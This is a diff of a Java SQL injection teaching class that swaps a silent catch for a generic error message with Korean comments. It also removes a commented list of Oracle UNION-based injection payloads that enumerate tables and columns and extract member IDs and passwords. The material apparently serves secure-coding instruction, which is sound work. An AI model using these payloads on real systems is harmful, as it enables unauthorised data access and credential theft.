@@ -1,4 +1,4 @@
-package secure.exam;
+package secure.injection.test;
 
 import java.sql.Connection;
 import java.sql.PreparedStatement;
@@ -47,31 +47,14 @@ public class StudentInjectMain {
 				System.out.format("%-10s\t %-20s\t %6d \n",stdNo, stdName, stdYear);
 			}
 		}catch(Exception e) {
-			//e.printStackTrace();
+			// e.printStackTrace(); // 로그용으로 구성
+			// 페이지인 경우에는 에러페이지가 전송되도록 구성
+			System.out.println("잘못된 구문이 입력되었습니다");
 		}
 	}
 }
 
-///////////////////////////////////////////////////////////////////////////////
-/// 
-/// book 테이블의 컬럼명과 타입
-/// ' UNION ALL SELECT column_name, data_type, NULL, NULL, NULL, NULL FROM user_tab_columns WHERE table_name='BOOK' --
-/// 
-/// book 테이블의 데이터 출력
-/// ' UNION SELECT bookNo, bookName, bookPrice, bookAuthor, bookDate, pubNo FROM book --
-/// 
-/// 
-/// 'or 1=1 union select table_name, null,null,null,null,null from user_tables --
-/// 
-/// 'or 1=1 union select table_name, null,null,null,null,null from user_tables -- 
-/// 
-/// 'or 1=1 union select column_name, null,null,null,null,null from all_tab_columns where table_name='MEMBER' --
-/// 
-/// 
-/// 'or 1=1 union select column_name, data_type,null,null,null,null from all_tab_columns where table_name='MEMBER' --
-/// 
-/// 
-/// ' or 1=1 union select memid, mempwd, null, null, null, null from MEMBER --
+
 
 
 
